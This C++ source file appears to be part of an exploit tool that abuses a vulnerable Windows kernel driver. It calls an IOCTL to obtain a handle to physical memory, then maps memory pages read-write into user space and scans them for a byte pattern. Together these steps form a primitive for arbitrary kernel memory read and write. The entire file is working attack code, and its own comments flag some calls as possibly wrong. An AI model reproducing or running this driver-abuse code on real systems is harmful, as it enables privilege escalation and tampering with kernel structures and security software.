#include "rw_primitive.h"
#include "windows_helper_functions.h"
#include <vector>

using myNtMapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD64 InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);
myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));

using myNtUnmapViewOfSection = NTSTATUS(NTAPI*)(
	HANDLE SectionHandle,
	PVOID BaseAddress
	);
myNtUnmapViewOfSection fNtUnmapViewOfSection = (myNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));


BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, __int64 Address, SIZE_T Length, PVOID* VirtualAddress)
{
	NTSTATUS			ntStatus;
	PHYSICAL_ADDRESS	SectionOffset;
	SectionOffset.QuadPart = (ULONGLONG)(Address);
	*VirtualAddress = 0;
	ntStatus = fNtMapViewOfSection // maybe wrong function call?
	(
		PhysicalMemory,
		GetCurrentProcess(),
		VirtualAddress,
		0L,
		Length,
		&SectionOffset,
		&Length,
		2,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(ntStatus)) return false;
	return true;
}

BOOLEAN UnmapPhysicalMemory(PVOID* buffer) {
	NTSTATUS	ntStatus;

	ntStatus = fNtUnmapViewOfSection
	(
		GetCurrentProcess(),
		*buffer
	);
	// returns STATUS_NOT_MAPPED_VIEW(0xC0000019)...
	if (!NT_SUCCESS(ntStatus)) return false;
	return true;
}

// returns 0 on success and saves handle to hPhysicalMemory
// return -1 on failure
int GetDevicePhysicalMemoryHandle(LPCWSTR driverName, HANDLE* hPhysicalMemory) {
	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;
	DWORD bytesReturned = 0;


	device = CreateFileW(driverName, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "[!] Could not open device: 0x%X\n", GetLastError());
		CloseHandle(device);
		return -1;
	}

	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device,
		IOCTL_MapPhysicalMemoryToLinearSpace,
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&hPhysicalMemory,
		sizeof(hPhysicalMemory),
		&bytesReturned,
		(LPOVERLAPPED)NULL);

	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
		CloseHandle(device);
		return -1;
	}


	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[*] Buffer from the kernel land: %p", hPhysicalMemory);
	CloseHandle(device);

	return 0;
}

int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength, HANDLE hPhysicalMemory, std::vector <unsigned __int64>& locations) {
	int memRegionsCount = -1;
	printf("[ ] Search for pattern: \"%s\"\n", pattern);

	memRegionsCount = GetPhysicalMemoryLayout(NULL);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memRegionsCount, sizeof(MEMORY_REGION));
	if (memRegion == NULL) {
		fprintf(stderr, "[!] calloc() failed.\n");
		return -1;
	}
	memRegionsCount = GetPhysicalMemoryLayout(memRegion);
	if (memRegionsCount == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}

	printf("[+] Physical memory regions\n");
	for (int i = 0; i < memRegionsCount; i++) {
		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
	}
	printf("\n[ ]Scanning through each physical memory region...\n");

	PVOID* buf = (PVOID*)malloc(0x1000);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}

	PVOID* fourPages = (PVOID*)malloc(0x4000);
	if (fourPages == 0) {
		exit(EXIT_FAILURE);
	}
	unsigned int patternFoundCount = 0;
	// go through mapped physical memory regions
	for (int i = 0; i < memRegionsCount; i++) {
		unsigned __int64 start = memRegion[i].address;
		unsigned __int64 end = memRegion[i].address + memRegion[i].size;
		printf("%p - %p\n", (void*)start, (void*)end);
		fflush(stdout);

		// go through each page in memory region
		for (unsigned __int64 page = start; page < end; page = page + 0x1000) {
			if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page, 0x1000, buf) == FALSE) {
				fprintf(stderr, "[!] MapPhysicalMemory failed");
				return -1;
			}
			PVOID castedBuf = *buf;
			int offset2 = 0;
			// go through page byte by byte and search for pattern
			for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++)
			{
				castedBuf = (unsigned char*)castedBuf + 1;
				if (memcmp(castedBuf, pattern, patternLength) == 0)
				{
					unsigned __int64 patternLocation = page + offset;
					locations.push_back(patternLocation);
					printf("[%d] Found pattern at: %p\n", patternFoundCount ,(void*)(page + offset));
					patternFoundCount++;
				}
			}
			if (UnmapPhysicalMemory(buf) == FALSE) {
				printf("UnmapPhysicalMemory failed");
				return -1;
			}
		}
	}
	printf("[+] Scanned through every physical memory region\n");

	free(memRegion);
	free(buf);
	return 0;
}